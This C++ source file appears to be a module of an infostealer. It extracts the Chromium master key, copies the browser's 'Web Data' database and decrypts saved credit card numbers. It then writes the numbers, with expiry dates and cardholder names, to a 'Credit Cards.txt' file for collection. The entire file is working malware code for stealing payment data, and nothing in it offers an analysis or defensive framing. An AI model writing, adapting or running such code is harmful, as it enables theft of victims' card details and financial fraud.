//
// Created by .1qxz on 08.06.2024.
//

#include "CCreditCards.h"

void CCreditCards::execute(const fs::path &root, const std::string &name, const fs::path &path) {
    std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(path);

    if(master_key.empty())
        return;

    fs::path orig_db_path = path / "Default" / "Web Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<CreditCard> history = CCreditCards::getCreditCards(copied_db, master_key);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(const CreditCard &row : history)
    {
        ss << "Card: " << row.card_number << "\n";
        ss << "  Expiration: " << std::to_string(row.expiration_month) << "/" << std::to_string(row.expiration_year) << "\n";
        ss << "  Name: " << row.name_on_card << "\n";
        ss << "  Used: " << row.use_count << "\n";
        ss << "\n";
    }

    Utils::writeFile(root / "Credit Cards.txt", ss.str());
}

std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path, const std::vector<BYTE> &master_key) {
    std::list<CreditCard> creditCardList;
    sqlite3* db;
    sqlite3_stmt* stmt;
    int rc;

    rc = sqlite3_open(db_path.string().c_str(), &db);
    if (rc) {
        return {};
    }

    const char* sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, use_count FROM credit_cards ORDER BY use_count DESC";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return {};
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* name_on_card = sqlite3_column_text(stmt, 0);
        int expiration_month = sqlite3_column_int(stmt, 1);
        int expiration_year = sqlite3_column_int(stmt, 2);

        const void* card_number_encrypted = sqlite3_column_blob(stmt, 3);
        int card_number_size = sqlite3_column_bytes(stmt, 3);

        int use_count = sqlite3_column_int(stmt, 4);

        CreditCard creditCardRecord;
        creditCardRecord.name_on_card = std::string(reinterpret_cast<const char*>(name_on_card));
        creditCardRecord.expiration_month = expiration_month;
        creditCardRecord.expiration_year = expiration_year;
        creditCardRecord.use_count = use_count;

        std::vector<BYTE> card_number;
        card_number.assign(static_cast<const BYTE*>(card_number_encrypted), static_cast<const BYTE*>(card_number_encrypted) + card_number_size);

        std::string decoded_card_number = ChromiumUtil::decryptData(card_number, master_key);
        creditCardRecord.card_number = decoded_card_number;

        creditCardList.push_back(creditCardRecord);
    }

    // Проверка на ошибки
    if (rc != SQLITE_DONE) {
        std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
    }

    // Освобождение ресурсов
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return creditCardList;
}
